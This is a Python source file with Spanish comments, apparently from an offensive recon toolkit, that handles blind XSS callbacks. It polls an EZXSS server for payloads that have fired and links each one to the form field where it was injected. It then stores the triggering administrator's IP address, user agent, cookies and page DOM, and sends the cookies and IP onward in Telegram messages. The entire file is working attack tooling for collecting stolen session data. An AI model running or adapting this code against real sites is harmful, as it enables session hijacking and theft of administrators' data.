#!/usr/bin/env python3
"""
core/blindxss_callback.py — Receptor de callbacks de EZXSS
Hackeadora consulta periódicamente EZXSS buscando payloads disparados
y los cruza con la tabla blindxss_payloads para saber exactamente
de dónde vino cada uno.

Uso:
  python3 core/blindxss_callback.py --poll       # polling cada 5 min
  python3 core/blindxss_callback.py --check-now  # comprobación única
"""

import os
import sys
import json
import sqlite3
import time
import argparse
from pathlib import Path
from datetime import datetime

try:
    import requests
except ImportError:
    print("[!] pip3 install requests")
    sys.exit(1)

# ── Config ────────────────────────────────────────────────────
BASE_DIR    = Path(__file__).parent.parent
DB_PATH     = os.environ.get("RECONFLOW_DB", str(BASE_DIR / "data" / "recon.db"))
EZXSS_URL   = os.environ.get("EZXSS_URL", "")
EZXSS_PASS  = os.environ.get("EZXSS_ADMIN_PASS", "")
TELEGRAM_BOT  = os.environ.get("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT = os.environ.get("TELEGRAM_CHAT_ID", "")
POLL_INTERVAL = int(os.environ.get("BLINDXSS_POLL_INTERVAL", "300"))  # 5 min

# ── DB helpers ────────────────────────────────────────────────
def db_conn():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def get_pending_payload(payload_id: str):
    """Busca un payload_id pendiente en nuestra DB."""
    with db_conn() as conn:
        try:
            return conn.execute(
                "SELECT * FROM blindxss_payloads WHERE payload_id=? AND fired=0",
                (payload_id,)
            ).fetchone()
        except Exception:
            return None

def mark_fired(payload_id: str, fired_from: str, fired_ip: str,
               fired_ua: str, fired_cookies: str, fired_dom: str):
    """Marca un payload como disparado con todos los datos capturados."""
    with db_conn() as conn:
        conn.execute(
            """UPDATE blindxss_payloads
               SET fired=1, fired_at=CURRENT_TIMESTAMP,
                   fired_from=?, fired_ip=?, fired_ua=?,
                   fired_cookies=?, fired_dom=?
               WHERE payload_id=?""",
            (fired_from, fired_ip, fired_ua,
             fired_cookies, fired_dom, payload_id)
        )
        # Añadir a findings principales
        payload = conn.execute(
            "SELECT * FROM blindxss_payloads WHERE payload_id=?",
            (payload_id,)
        ).fetchone()
        if payload:
            try:
                conn.execute(
                    """INSERT OR IGNORE INTO findings
                       (domain_id, type, severity, target, template, detail)
                       VALUES(?,?,?,?,?,?)""",
                    (
                        payload["domain_id"],
                        "blind_xss",
                        "high",
                        payload["target_url"],
                        f"blindxss:{payload['field_type']}:{payload['field_name']}",
                        f"Blind XSS disparado desde {fired_from} "
                        f"| Campo: {payload['field_name']} "
                        f"| IP admin: {fired_ip}",
                    )
                )
            except Exception:
                pass
        conn.commit()

def get_unfired_payloads():
    """Lista todos los payloads pendientes de disparar."""
    with db_conn() as conn:
        try:
            return [dict(r) for r in conn.execute(
                """SELECT p.*, d.domain FROM blindxss_payloads p
                   JOIN domains d ON d.id=p.domain_id
                   WHERE p.fired=0
                   ORDER BY p.injected_at DESC"""
            ).fetchall()]
        except Exception:
            return []

def get_fired_payloads():
    """Lista payloads ya disparados, sin notificar."""
    with db_conn() as conn:
        try:
            return [dict(r) for r in conn.execute(
                """SELECT p.*, d.domain FROM blindxss_payloads p
                   JOIN domains d ON d.id=p.domain_id
                   WHERE p.fired=1 AND p.notified=0"""
            ).fetchall()]
        except Exception:
            return []

def mark_notified(payload_id: str):
    with db_conn() as conn:
        conn.execute(
            "UPDATE blindxss_payloads SET notified=1 WHERE payload_id=?",
            (payload_id,)
        )
        conn.commit()

# ── EZXSS API ─────────────────────────────────────────────────
class EZXSSClient:
    def __init__(self):
        self.base = EZXSS_URL.rstrip("/")
        self.session = requests.Session()
        self._logged_in = False

    def _login(self) -> bool:
        if self._logged_in:
            return True
        try:
            r = self.session.post(
                f"{self.base}/manage/login",
                data={"password": EZXSS_PASS},
                allow_redirects=True,
                timeout=10,
                verify=True,
            )
            self._logged_in = r.status_code == 200 and "logout" in r.text.lower()
            return self._logged_in
        except Exception as e:
            print(f"[!] EZXSS login error: {e}")
            return False

    def get_reports(self) -> list:
        """Obtiene todos los reportes de payloads disparados de EZXSS."""
        if not self._login():
            return []
        try:
            r = self.session.get(
                f"{self.base}/manage/reports",
                timeout=15,
            )
            if r.status_code != 200:
                return []
            # EZXSS devuelve JSON en /manage/api/reports
            r2 = self.session.get(
                f"{self.base}/manage/api/reports",
                timeout=15,
            )
            if r2.status_code == 200:
                return r2.json().get("reports", [])
            return []
        except Exception as e:
            print(f"[!] EZXSS get_reports error: {e}")
            return []

    def get_report_detail(self, report_id: int) -> dict:
        """Obtiene el detalle completo de un reporte."""
        if not self._login():
            return {}
        try:
            r = self.session.get(
                f"{self.base}/manage/api/reports/{report_id}",
                timeout=15,
            )
            return r.json() if r.status_code == 200 else {}
        except Exception:
            return {}

# ── Telegram ──────────────────────────────────────────────────
def notify(msg: str):
    if not TELEGRAM_BOT or not TELEGRAM_CHAT:
        return
    try:
        requests.post(
            f"https://api.telegram.org/bot{TELEGRAM_BOT}/sendMessage",
            json={
                "chat_id":    TELEGRAM_CHAT,
                "text":       msg,
                "parse_mode": "Markdown",
            },
            timeout=10,
        )
    except Exception:
        pass

# ── Procesamiento de callbacks ────────────────────────────────
def process_ezxss_reports():
    """
    Consulta EZXSS, cruza con nuestra DB y notifica.
    El payload_id está codificado en la URL del script JS:
    https://xss.tudominio.com/a3f7b2c1.js → payload_id = a3f7b2c1
    """
    if not EZXSS_URL:
        print("[!] EZXSS_URL no configurada")
        return 0

    client = EZXSSClient()
    reports = client.get_reports()
    if not reports:
        return 0

    processed = 0

    for report in reports:
        # Extraer payload_id de la URL del script
        # El script se carga como: /a3f7b2c1.js
        payload_url = report.get("payload", "")
        if not payload_url:
            continue

        # Extraer el hash del path
        import re
        match = re.search(r'/([a-f0-9]{8})\.js', payload_url)
        if not match:
            continue

        payload_id = match.group(1)

        # Buscar en nuestra DB
        pending = get_pending_payload(payload_id)
        if not pending:
            # Payload no es nuestro o ya procesado
            continue

        # Obtener detalle completo
        detail = client.get_report_detail(report.get("id", 0))

        fired_from    = detail.get("uri", report.get("uri", ""))
        fired_ip      = detail.get("ip", "")
        fired_ua      = detail.get("user-agent", "")
        fired_cookies = json.dumps(detail.get("cookies", {}))
        fired_dom     = str(detail.get("dom", ""))[:500]

        # Guardar en DB
        mark_fired(
            payload_id, fired_from, fired_ip,
            fired_ua, fired_cookies, fired_dom
        )

        # Notificar por Telegram
        msg = (
            f"🎯🎯 *Blind XSS DISPARADO*\n"
            f"🌐 Dominio: `{pending['subdomain']}`\n"
            f"📝 Campo: `{pending['field_name']}` ({pending['field_type']})\n"
            f"🔗 Inyectado en: `{pending['target_url'][:80]}`\n"
            f"💥 Disparado desde: `{fired_from[:100]}`\n"
            f"🖥️ IP admin: `{fired_ip}`\n"
            f"🌐 UA admin: `{fired_ua[:80]}`\n"
            f"🍪 Cookies: `{fired_cookies[:100]}`\n"
            f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        notify(msg)
        print(f"\n[!!!] BLIND XSS FIRED: {payload_id}")
        print(f"      Campo: {pending['field_name']} en {pending['target_url']}")
        print(f"      Desde: {fired_from}")
        print(f"      IP: {fired_ip}")

        processed += 1

    return processed

# ── Main ──────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="Blind XSS callback handler")
    parser.add_argument("--poll",       action="store_true",
                        help=f"Polling continuo cada {POLL_INTERVAL}s")
    parser.add_argument("--check-now",  action="store_true",
                        help="Comprobación única")
    parser.add_argument("--pending",    action="store_true",
                        help="Mostrar payloads pendientes")
    parser.add_argument("--fired",      action="store_true",
                        help="Mostrar payloads ya disparados")
    args = parser.parse_args()

    if args.pending:
        payloads = get_unfired_payloads()
        print(f"\nPayloads pendientes: {len(payloads)}")
        for p in payloads:
            print(f"  {p['payload_id']} — {p['subdomain']} — "
                  f"{p['field_name']} ({p['field_type']}) — "
                  f"{p['injected_at'][:16]}")
        return

    if args.fired:
        payloads = get_fired_payloads()
        print(f"\nPayloads disparados (sin notificar): {len(payloads)}")
        for p in payloads:
            print(f"  {p['payload_id']} — {p['domain']} — "
                  f"Desde: {p['fired_from'][:60]}")
        return

    if args.check_now:
        print("[→] Comprobando EZXSS...")
        n = process_ezxss_reports()
        print(f"[✓] {n} payloads procesados")
        return

    if args.poll:
        print(f"[→] Polling EZXSS cada {POLL_INTERVAL}s...")
        while True:
            try:
                n = process_ezxss_reports()
                if n > 0:
                    print(f"[!!!] {n} Blind XSS disparados!")
            except Exception as e:
                print(f"[!] Error en polling: {e}")
            time.sleep(POLL_INTERVAL)
        return

    parser.print_help()

if __name__ == "__main__":
    main()
